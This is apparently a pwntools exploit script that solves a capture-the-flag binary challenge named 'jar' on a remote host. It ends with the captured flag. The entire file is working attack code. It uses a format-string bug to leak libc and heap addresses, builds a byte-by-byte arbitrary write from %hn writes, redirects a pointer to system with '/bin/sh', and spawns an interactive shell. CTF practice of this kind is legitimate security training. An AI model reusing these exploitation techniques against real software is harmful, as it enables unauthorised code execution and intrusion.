from pwn import *

uu64 = lambda x: u64(x.ljust(8, b"\x00"))
uu32 = lambda x: u32(x.ljust(4, b"\x00"))


def add(content):
    r.sendlineafter("Choice: \n", b"1")
    r.sendafter(": ", content)


def free(idx):
    r.sendlineafter("Choice: \n", b"2")
    r.sendlineafter("? \n", str(idx))


def edit(idx, content):
    r.sendlineafter("Choice: \n", b"4")
    r.sendlineafter("? \n", str(idx))
    r.sendafter(": \n", content)


def write8(addr, data):
    data = data & 0xFF
    assert (data < 0xF8)
    if data > 1:
        edit(0, b"A" * (data - 1) + b"\n")
        r.sendlineafter("Choice: \n", b"A" * 32 + b"%s%9$hn")
    elif data == 1:
        r.sendlineafter("Choice: \n", b"A" * 32 + b"%c%9$hn")
    else:
        r.sendlineafter("Choice: \n", b"A" * 32 + b"%9$hn")
    r.sendlineafter("Choice: \n", p64(0) + p64(addr))
    r.sendlineafter("Choice: \n", b"3")


def write64(addr, data):
    for i in range(8):
        write8(addr + i, data)
        data >>= 8
        if data == 0:
            break


def exploit(r):

    log.info("leaking libc...")
    r.sendlineafter("Choice: \n", b"A" * 32 + b"%85$lx;")
    add("AAAAAAAAAAAAAAAA\n")
    r.sendlineafter("Choice: \n", b"3")
    libc = int(r.recvuntil(";", 1), 16) - 0x020840  # __libc_start_main_ret
    log.info("libc leaked")
    log.success("libc --> %s" % hex(libc))
    sleep(1)

    log.info("leaking heap...")
    r.sendlineafter("Choice: \n", b"6")
    r.sendlineafter("? \n", b"0")
    r.recvuntil(": ")
    heap = int(r.recvuntil("Main", 1), 16)
    log.info("heap leaked")
    log.success("heap --> %s" % hex(heap))
    sleep(1)

    log.info("overwriting GOT...")
    write64(heap, libc + 0x0453a0)  # system
    write64(heap + 8, heap - 0x100)
    log.info("done")
    edit(0, "/bin/sh\x00\n")

    r.sendlineafter("Choice: \n", b"5")
    r.sendlineafter(")\n", b"0")


BINARY = "jar"
elf = ELF(BINARY)
HOST = "jh2i.com"
PORT = 50030
r = remote(HOST, PORT)
exploit(r)
r.interactive()

# FLAG --> flag{the_house_always_wins}
